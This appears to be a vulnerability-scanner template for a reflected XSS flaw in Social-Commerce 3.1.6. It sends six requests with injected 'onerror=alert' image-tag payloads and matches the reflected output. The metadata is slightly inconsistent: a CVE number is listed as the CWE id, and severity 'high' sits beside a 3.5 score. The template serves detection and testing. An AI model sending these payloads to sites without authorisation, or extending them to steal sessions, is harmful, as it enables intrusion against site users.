id: Social-Commerce-xss

info:
  name: Social-Commerce 3.1.6 - Reflected XSS
  author: momika233
  severity: high
  description: |
    The attacker can send to victim a link containing a malicious URL in an email or instant message,can perform a wide variety of actions, such as stealing the victim's session token or login credentials
  reference:
    - https://www.exploit-db.com/exploits/51671
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N
    cvss-score: 3.5
    cwe-id: CVE-2023-4174
  metadata:
    max-request: 1
    verified: true
    fofa-query: icon_hash="702863115"
  tags: Social,xss

requests:
  - method: GET
    path:
      - "{{BaseURL}}/search/index?q=momika233\"><img%20src=a%20onerror=alert('momika233')>momika233"
      - "{{BaseURL}}/user_infomomika233\"><img%20src=a%20onerror=alert('momika233')>momika233/index/friends"
      - "{{BaseURL}}/user_info/indexmomika233\"><img%20src=a%20onerror=alert('momika233')>momika233/friends"
      - "{{BaseURL}}/faqsmomika233\"><img%20src=a%20onerror=alert('momika233')>momika233/index?content_search="
      - "{{BaseURL}}/faqs/indexmomika233\"><img%20src=a%20onerror=alert('momika233')>momika233?content_search="
      - "{{BaseURL}}/storesmomika233\"><img%20src=a%20onerror=alert('momika233')>momika233/all-products?store_id=&keyword=&price_from=&price_to=&rating=&store_category_id=&sortby=most_recent"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 404

      - type: regex
        part: body
        regex:
          - "onerror=alert.*"
